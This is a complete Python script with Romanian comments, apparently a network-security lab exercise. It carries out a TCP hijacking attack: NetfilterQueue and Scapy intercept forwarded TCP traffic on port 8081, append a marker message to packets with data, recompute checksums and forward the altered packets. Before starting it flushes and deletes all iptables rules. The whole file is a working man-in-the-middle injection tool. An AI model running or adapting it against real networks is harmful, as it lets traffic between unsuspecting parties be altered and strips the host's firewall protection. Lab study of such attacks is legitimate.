#!/usr/bin/env python3
from netfilterqueue import NetfilterQueue
from scapy.all import *
import os

# Mesajul care va fi inserat
INJECTED_MESSAGE = "ATAC TCP HIJACKING REUSIT!"

def modify_packet(packet):
    """
    Modifică pachetul TCP și inserează mesajul
    """
    try:
        # Convertim pachetul în format Scapy
        pkt = IP(packet.get_payload())
        
        # Verificăm dacă este un pachet TCP
        if pkt.haslayer(TCP):
            # Verificăm dacă are flag-ul PUSH setat
            if pkt[TCP].flags & 0x08:  # PSH flag
                # Modificăm payload-ul
                if Raw in pkt:
                    # Păstrăm payload-ul original și adăugăm mesajul nostru
                    original_payload = pkt[Raw].load.decode('utf-8', errors='ignore')
                    new_payload = original_payload + "\n" + INJECTED_MESSAGE
                    
                    # Actualizăm lungimea pachetului
                    pkt[Raw].load = new_payload.encode()
                    
                    # Recalculăm checksum-urile
                    del pkt[IP].chksum
                    del pkt[TCP].chksum
                    
                    # Setăm noul pachet
                    packet.set_payload(bytes(pkt))
                    print(f"Pachet modificat: {original_payload} -> {new_payload}")
        
        # Acceptăm pachetul modificat
        packet.accept()
        
    except Exception as e:
        print(f"Eroare la modificarea pachetului: {e}")
        packet.accept()

def setup_queue():
    """
    Configurează coada NetfilterQueue
    """
    # Ștergem regula dacă există
    os.system('iptables -F')
    os.system('iptables -X')
    
    # Adăugăm regula pentru a captura traficul TCP
    os.system('iptables -A FORWARD -p tcp --dport 8081 -j NFQUEUE --queue-num 1')
    
    # Creăm coada
    queue = NetfilterQueue()
    queue.bind(1, modify_packet)
    
    try:
        print("Așteptăm pachete...")
        queue.run()
    except KeyboardInterrupt:
        print("Oprire...")
    finally:
        queue.unbind()
        os.system('iptables -F')

if __name__ == "__main__":
    setup_queue() 